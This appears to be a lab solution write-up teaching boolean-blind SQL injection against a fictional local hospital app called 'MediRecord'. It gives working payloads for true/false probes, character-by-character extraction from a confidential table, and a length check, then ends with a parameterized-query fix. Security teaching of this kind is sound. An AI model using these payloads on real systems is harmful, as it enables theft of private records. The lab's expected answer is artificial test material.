# Lab 04 Solution: MediRecord Incident Desk

## Goal

Recover the `INCIDENT_LOCKBOX` value from `hospital_confidential` using only
`Patient Found` and `Patient Not Found`.

Expected final value:

```text
MED-LOCK-7Q2-PULSE
```

## Step 1: Confirm The Boolean Signal

Open:

```text
http://localhost:3000/lab/04-boolean-blind/patients
```

Submit a real patient ID:

```text
PAT-001
```

The page returns `Patient Found`.

Submit a fake patient ID:

```text
PAT-999
```

The page returns `Patient Not Found`.

## Step 2: Prove Injection With True And False Conditions

True condition:

```sql
PAT-001' AND 'a'='a' --
```

Expected response:

```text
Patient Found
```

False condition:

```sql
PAT-001' AND 'a'='b' --
```

Expected response:

```text
Patient Not Found
```

Now the page's response can be treated as a yes/no answer from the database.

## Step 3: Extract The First Character

Test the first character of the lockbox value:

```sql
PAT-001' AND SUBSTRING((SELECT record_data FROM hospital_confidential WHERE record_type='INCIDENT_LOCKBOX'),1,1)='M' --
```

If the page says `Patient Found`, the first character is `M`.

If it says `Patient Not Found`, try another character.

## Step 4: Repeat For Each Position

Change the second argument to `SUBSTRING` for each character position:

```sql
PAT-001' AND SUBSTRING((SELECT record_data FROM hospital_confidential WHERE record_type='INCIDENT_LOCKBOX'),2,1)='E' --
PAT-001' AND SUBSTRING((SELECT record_data FROM hospital_confidential WHERE record_type='INCIDENT_LOCKBOX'),3,1)='D' --
```

Continue until the full value is recovered:

```text
MED-LOCK-7Q2-PULSE
```

## Optional Faster Check

You can check the length before extracting every character:

```sql
PAT-001' AND LENGTH((SELECT record_data FROM hospital_confidential WHERE record_type='INCIDENT_LOCKBOX'))=18 --
```

## Why It Works

The vulnerable query is:

```sql
SELECT *
FROM hospital_patients
WHERE patient_id='<input>';
```

The payload keeps `PAT-001` as a valid row and appends an extra condition. When
the extra condition is true, the original patient row still matches. When it is
false, no row is returned.

## Secure Fix

Use a parameterized query:

```ts
await pool.query(
  "SELECT * FROM hospital_patients WHERE patient_id = $1",
  [patientId]
);
```

The application should also normalize error handling, but hiding errors alone
does not fix SQL injection. The query must separate code from data.
